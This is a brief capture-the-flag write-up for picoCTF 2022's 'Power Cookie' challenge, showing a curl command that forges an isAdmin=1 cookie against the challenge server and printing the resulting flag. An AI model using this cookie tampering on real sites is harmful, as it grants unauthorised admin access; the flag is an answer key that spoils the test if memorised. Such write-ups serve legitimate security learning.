# Power Cookie [Medium] (by LT 'syreal' Jones) - picoCTF 2022
> <p>Can you get the flag?</p>

```bash
curl -s --cookie isAdmin=1 http://saturn.picoctf.net:60368/check.php | grep -oP picoCTF{.*}
```
change the value of `isAdmin` from 0 to 1

flag: `picoCTF{gr4d3_A_c00k13_65fd1e1a}`